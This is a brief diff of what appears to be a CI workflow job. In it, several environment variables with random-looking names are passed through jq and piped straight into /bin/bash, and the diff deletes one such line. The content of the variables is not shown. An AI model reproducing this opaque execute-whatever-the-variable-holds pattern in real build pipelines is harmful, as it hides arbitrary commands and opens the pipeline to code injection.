@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
           printf '%s' "$tpql19469" | jq -r .tezi1 | /bin/bash
-          printf '%s' "$a56" | jq -r .uws025 | /bin/bash
           echo $fvws6 | jq -r .mofdq971 | /bin/bash
 
       - name: Upload artifact
